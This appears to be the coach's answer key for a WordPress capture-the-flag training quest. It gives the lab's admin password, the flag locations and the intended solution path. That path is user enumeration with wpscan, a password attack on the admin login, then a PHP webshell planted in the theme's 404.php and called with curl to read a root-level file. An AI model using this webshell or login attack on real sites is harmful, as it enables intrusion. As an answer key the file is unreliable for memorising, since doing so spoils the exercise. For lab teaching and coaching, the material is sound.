Quest: web-t2-wordpress (tier 2, web-appsec)

Ground truth for the coach:
- wordpress:6.5-apache + mysql:8.0 on docker net wp-net; wp listens on :80
- admin / passw0rd — in metasploit's unix_passwords.txt and rockyou
- flag A: /wp-content/uploads/flag.txt — fetchable over plain HTTP, rewards
  enumeration (wpscan media-dir / gobuster / just browsing to it)
- flag B: /flag.txt at the container root — NOT web-reachable; requires RCE:
  wp-admin → Appearance → Theme File Editor → 404.php → inject
  <?php system($_GET['c']); ?> → curl any-404?c=cat+/flag.txt
- flag injection happens via docker exec — files exist as root 0644, the
  apache user can read them

Intended path:
wpscan -e u → uploads flag (free) → password attack admin → theme editor
404.php webshell → cat /flag.txt

Common wrong turns:
- attacking xmlrpc brute-force first — fine but slower; wpscan's password
  module on wp-login is enough
- looking for the rce flag under the web root — it's at container /
- rockyou.txt.gz still compressed — same lesson as net-t2: decompress or
  use unix_passwords.txt
- forgetting to `docker`-think: the "server" is a container; /flag.txt is
  inside it — webshell reads it fine anyway

Style: tier 2 — most realistic CMS path there is. If they got in via xmlrpc
instead of wp-login, that's equally valid — confirm the win.
